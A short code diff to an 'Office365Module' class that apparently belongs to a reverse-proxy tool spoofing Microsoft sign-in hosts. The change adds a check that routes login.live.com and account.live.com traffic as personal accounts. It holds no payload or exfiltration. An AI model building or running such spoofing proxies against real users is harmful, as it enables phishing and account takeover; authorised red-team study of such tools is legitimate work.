@@ -687,6 +687,10 @@ class Office365Module(BaseModule):
                 base_host = request.host[:-len(spoof_suffix)] if request.host.endswith(spoof_suffix) else request.host
                 is_personal = base_host.endswith('live.com') or base_host.startswith('login.live.com') or base_host.startswith('account.live.com')
 
+            # Extra safety: if the current spoof host clearly starts with login.live.com or account.live.com treat as personal
+            if not is_personal and (request.host.startswith('login.live.com') or request.host.startswith('account.live.com')):
+                is_personal = True
+
             if is_personal:
                 # For personal accounts, route to consumer domains
                 if 'consumers' in path or 'fido' in path or 'microsoft.com' in path:
